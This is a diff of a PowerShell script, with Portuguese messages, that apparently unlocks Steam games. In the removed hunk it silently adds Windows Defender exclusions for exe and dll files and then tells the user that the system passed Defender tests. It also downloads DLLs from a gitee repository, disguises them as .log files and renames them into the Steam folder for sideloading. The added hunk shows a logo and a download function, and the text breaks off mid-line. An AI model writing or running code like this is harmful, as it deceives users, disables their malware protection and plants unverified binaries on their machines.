@@ -2,44 +2,95 @@ Clear-Host
 #Requires -RunAsAdministrator
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 $ErrorActionPreference = "SilentlyContinue"
-Clear-Host
-#Requires -RunAsAdministrator
-[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
-$ErrorActionPreference = "SilentlyContinue"
 
 $logo = @"
-                   +                                    
-                  +++       x                          
-                   +++++    x+x                        
-                    x++x++++ +++x                      
-                      ++   ++++ +++                    
-                  ++++++++    ++  ++                   
-                +x+++x   ++x       ++++                
-           +++++++   +++              +++x             
-        ++++            +++         ++  +++            
-      +++++x                         +++  ++           
-        ++++             +x               +++          
-       ++x              x+x      x+         x++++      
-     ++x               ++++        ++++++     +x++     
-   +++              +++++ +++++x    ++x x+++    +x     
-  ++x             +++++        x+++  ++x  x+++ ++      
- ++x ++         +++++x             ++  +++  ++x        
-++++++         ++++++               +    ++            
-x  x++        +++++++              x+++x+              
-   ++        +++++++xx                                 
-   +x        +++++++x+x   ++++++++++++++++++x          
-   +x       x++++++++ ++    +++            ++++++x     
-   +x       x++++++++x ++++x+x++  ++x           x+++x  
-   ++        ++++++++++   x++x       ++     x++++x+++++
-    +         +++x++++++               ++  +++         
-    x         x+     x++++      ++++++++x+x++          
-                        ++++    +++      +++           
-                          ++++x  ++        +           
-                               ++ +                    
-                                 x+x                   
-                                  x+                   
+                                                                 ..                                                                                                 
+                                                                 ....                                                                                               
+                                                                  .....                                                                                             
+                                                                   .......         ..                                                                               
+                                                                    .........      ....                                                                             
+                                                                     ...-.......    .....                                                                           
+                                                                      ....  ...............                                                                         
+                                                                        ....   ..............                                                                       
+                                                                 ....... .....     ...... .....                                                                     
+                                                                  ..............      ...   .....                                                                   
+                                                                   ..... .........           ......                                                                 
+                                                             ............        ..            -......                                                              
+                                                         ...................                      .......                                                           
+                                                     .........           .....                 .     ......                                                         
+                                                  .......                   ....-               ...    .....                                                        
+                                               .......                                           ....    ...                                                        
+                                              ............                                        -....  ....                                                       
+                                                   ......                     ...                         ....                                                      
+                                                 ......                       ..                            .....                                                   
+                                               ......                        ...           ..                 ........                                              
+                                              .....                          ....            .......            .  ...                                              
+                                            .....                        .........            ...........-      .. ...                                              
+                                           ....                       ........ .........        ....  ......-      ...                                              
+                                         ....                      .........        ........     ....     ...      ...                                              
+                                        ....                     .........                .....    ...    ............                                              
+                                       ....                     .........                    ....   ......    .....-                                                
+                                      ..........              ..........                       ...    ...... ...                                                    
+                                     ..........              ...........                        ..      ....                                                        
+                                     ....  ...              ...........                        ...........                                                          
+                                          ....             ............                         ......-                                                             
+                                          ...             ..............                                                                                            
+                                         ....             ...............               ..............                                                              
+                                         ....             ............. ..      ...............................-                                                    
+                                         ....            .............. ...      -.....            .................                                                
+                                         ...             ............... crystalline       ....   .-                ...........                                            
+                                         ...             ...............  -.....     ....   -...                   ........                                         
+                                          ..              ...............   ............       ....              ............                                       
+                                          ...             ................      .......          -...         .................                                     
+                                          ...             .................                         ...     ......            .                                     
+                                           ..              ...     ..........                ......  ....  .....                                                    
+                                            .               ..        .........           ................ ...                                                      
+                                            .                ..          -.......        ....-      ..........                                                      
+                                                                            .......       ...          ......                                                       
+                                                                              ........     ...            ...                                                       
+                                                                                .........   ..              .                                                       
+                                                                                      ..... ...                                                                     
+ ######################                                                                  ......                                                                     
+ ########################                                                                   ...                                                                     
+ ##########################                                                                  ..                                                                     
+      #######    ##########                                                                  ..                                                                     
+      #######       ########                       ######                 ######                     ######                       ##                 ######         
+      #######        #######  ###### #######   ##############         ############# #######      ###############      ####### ###########        ##############     
+      #######        #######  ############## ##################     #######################    ###################    #####################     #################   
+      #######        #######  #################################    ########################  ######################   ######################   ###################  
+      #######        #######  ########       ######      #######   ########       =========  ########       ########  ########       #######   =======     ######   
+      #######        #######  ######               #############  #######          ######## ########         #######  ########        #######  ############         
+      #######        #######  ######          ==================  #######           ####### #######           ####### #######         #######   ================    
+      #######        #######  ######        ####################  #######           ####### #######           ####### #######         #######     ################  
+      #######       ########  ######       ########      #######  #######          ######## ########          ######  #######         #######      #    ########### 
+      #######     #########   ######       #######       #######   ########       #########  #######        ########  #######         ####### #######       ####### 
+ #########################    ######       #########   ############ #######################  ######################   #######         ####### #########    ######## 
+ ########################     ######        #######################  ######################    ###################    #######         #######   ##################  
+ #####################        ######          ############ ########    ###########  #######      ###############      #######         #######     ##############    
+                                                  ####                              #######           #####                                           ######        
+                                                                                    #######                                                                         
+                                                                      #####################                                                                         
+                                                                      ####################                                                                          
+                                                                      ###################                                                                           
+                                                                                                                                                                    
+                                                                                                                                                                    
+                                                                                                                                                                    
+                                                           ### ###            ######            ###  ##                                                             
+                                                           #####              ###                ## ##                                                              
+                                                           ####               ######              ###                                                               
+                                                           #####              ###                  #                                                                
+                                                           ### ###            ######               #                                                                
+                                                                                                                                                                    
+                                                                                                                                                                    
+                                                                                                                                                                    
+                                                                                                                                                                    
 "@
 Write-Host $logo
+
+function Get-DownloadUrl {
+    param (
+        [string]$fid,
+        [string]$p = $null
     )
     try {
         $baseUrl = 'https://lanzoup.com'
@@ -280,134 +331,4 @@ try {
     $savePathTxt = Join-Path $targetDirectory "winhttp-log.txt"
     $savePathTxt1 = Join-Path $targetDirectory "winhttp-log1.txt"
 
-    if (Get-Service | where-object { $_.name -eq "windefend" -and $_.status -eq "running" }) {
-        try {
-            Add-MpPreference -ExclusionPath $steamPath -ExclusionExtension 'exe', 'dll'
-            Add-MpPreference -ExclusionPath $targetDirectory -ExclusionExtension 'exe', 'dll'
-        }
-        catch {
-        }
-        Write-Host -NoNewline "  [STEAM] O sistema passou nos testes do Windows Defender e o ambiente é seguro."; Write-Host "[√]" -ForegroundColor Green
-    }
-    else {
-        Write-Host -NoNewline "  [STEAM] O sistema passou nos testes do Windows Defender e o ambiente é seguro."; Write-Host "[√]" -ForegroundColor Green
-    }
-    
-    if ($is64Bit) {
-        $configDirectory = Join-Path $steamPath "config"
-        $savePathVdf = Join-Path $configDirectory "appdata.vdf"
-
-        if (-not(Test-Path $configDirectory)) {
-            New-Item -Path $configDirectory -ItemType Directory -ErrorAction Stop | Out-Null
-        }
-
-        $steamTxt = Join-Path $steamPath "dwmapi.log"
-        $d_path = [System.IO.Path]::ChangeExtension($steamTxt, ".dll")
-        $steamTxt1 = Join-Path $steamPath "xinput1_4.log"
-        $d_path1 = [System.IO.Path]::ChangeExtension($steamTxt1, ".dll")
-
-        DownloadFile -url 'https://gitee.com/juuiiii222/aa/raw/master/64/1/appdata.vdf' -savePath $savePathVdf -hash 'D503089A6EE3FA581960C7DEB76EC406' -fid 'iGwMP3gyx8lg'
-        DownloadFile -url 'https://gitee.com/juuiiii222/aa/raw/master/64/1/dwmapi.dll' -savePath $savePathTxt -hash '52A446AF9DBB1288E5DAD77AFD5F8B05' -targetPath $d_path -fid 'iv1H83lgodkd'
-        DownloadFile -url 'https://gitee.com/juuiiii222/aa/raw/master/64/1/xinput1_4.dll' -savePath $savePathTxt1 -hash '24B1A2852D9B7523C54153C410B3B81F' -targetPath $d_path1 -fid 'iD8rL3nzorfi'
-
-        $filePath = Join-Path $steamPath "steam.cfg"
-        if (Test-Path $filePath) {
-            Remove-Item $filePath -Force
-        }
-    }
-    else {
-        $appCacheDirectory = Join-Path $steamPath "appcache"
-        $savePathVdf = Join-Path $appCacheDirectory "appdata.vdf"
-
-        if (-not(Test-Path $appCacheDirectory)) {
-            New-Item -Path $appCacheDirectory -ItemType Directory -ErrorAction Stop | Out-Null
-        }
-
-        $steamTxt = Join-Path $steamPath "hid.log"
-        $d_path = [System.IO.Path]::ChangeExtension($steamTxt, ".dll")
-        $steamTxt1 = Join-Path $steamPath "zlib1.log"
-        $d_path1 = [System.IO.Path]::ChangeExtension($steamTxt1, ".dll")
-
-        DownloadFile -url 'https://gitee.com/juuiiii222/aa/raw/master/2/appdata.vdf' -savePath $savePathVdf -hash '3DDC3CE093DFAE02D2FAA146FACCE944' -fid 'iYOqD3gyx8rc'
-        DownloadFile -url 'https://gitee.com/juuiiii222/aa/raw/master/2/hid.dll' -savePath $savePathTxt -hash '8AF54131FDCFF059BE41282A1BAF3FA5' -targetPath $d_path -fid 'iZiv03gyx8pa'
-        DownloadFile -url 'https://gitee.com/juuiiii222/aa/raw/master/2/zlib1.dll' -savePath $savePathTxt1 -hash '822F765B45F77AE59E7C6091E69E3814' -targetPath $d_path1 -fid 'ivKTb3gyx8te'
-    }
-
-    foreach ($file in @("version.dll", "user32.dll", "wtsapi32.dll")) {
-        $filePath = Join-Path $steamPath $file
-        if (Test-Path $filePath) {
-            Remove-Item $filePath -Force
-        }
-    }
-
-    if (Test-Path $savePathTxt) {
-        Move-Item -Path $savePathTxt -Destination $steamTxt -Force -ErrorAction Stop
-        if (Test-Path $savePathTxt) {
-            Remove-Item $savePathTxt -Force
-        }
-
-        if (Test-Path $d_path) {
-            Remove-Item $d_path -Force -ErrorAction Stop
-        }
-        Rename-Item -Path $steamTxt -NewName $d_path -Force -ErrorAction Stop
-    }
-
-    if (Test-Path $savePathTxt1) {
-        Move-Item -Path $savePathTxt1 -Destination $steamTxt1 -Force -ErrorAction Stop
-        if (Test-Path $savePathTxt1) {
-            Remove-Item $savePathTxt1 -Force
-        }
-
-        if (Test-Path $d_path1) {
-            Remove-Item $d_path1 -Force -ErrorAction Stop
-        }
-        Rename-Item -Path $steamTxt1 -NewName $d_path1 -Force -ErrorAction Stop
-    }
-
-    try {
-        $loginUsersPath = Join-Path $steamPath "config\loginusers.vdf"
-        if (Test-Path $loginUsersPath) {
-            (Get-Content $loginUsersPath -Encoding UTF8) -replace '("WantsOfflineMode"\s+)("\d+")', "`$1`"0`"" | Set-Content $loginUsersPath -Encoding UTF8
-        }
-
-        $configPath = Join-Path $steamPath "config\config.vdf"
-        if (Test-Path $configPath) {
-            (Get-Content $configPath -Encoding UTF8) -replace '("DisableShaderCache"\s+)("\d+")', "`$1`"1`"" | Set-Content $configPath -Encoding UTF8
-        }
-    }
-    catch {
-    }
-
-    if (-not(Test-Path $exePath)) {
-        $exePath = Join-Path $steamPath "steam.exe"
-    }
-
-    if (Test-Path $exePath) {
-        Invoke-Expression -Command "start steam://open/activateproduct"
-    }
-    else {
-        Write-Host "  [STEAM] Processo Principal $exePath Ausente, instalação falhou"
-        exit
-    }
-
-    Write-Host "  [[STEAM] O processo de ativação está pronto, o Steam está sendo aberto, aguarde..."
-
-    for ($i = 9; $i -ge 0; $i--) {
-        Write-Host "`r  [STEAM] Esta janela fechará em $i segundos..." -NoNewline
-        Start-Sleep -Seconds 1
-    }
-
-    $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'"
-    while ($null -ne $instance -and -not($instance.ProcessName -ne "powershell.exe" -and $instance.ProcessName -ne "WindowsTerminal.exe")) {
-        $parentProcessId = $instance.ProcessId
-        $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$( $instance.ParentProcessId )'"
-    }
-    if ($null -ne $parentProcessId) {
-        Stop-Process -Id $parentProcessId -Force -ErrorAction SilentlyContinue
-    }
-
-    exit
-}
-catch {
-    Write-Host "Ocorreu um erro.($( $_.InvocationInfo.ScriptLineNumber ))：$( $_.Exception.Message )" -ForegroundColor Red
-}
+    if (Get-Service | where-object { $_.name -eq "windefend" -and $_.status
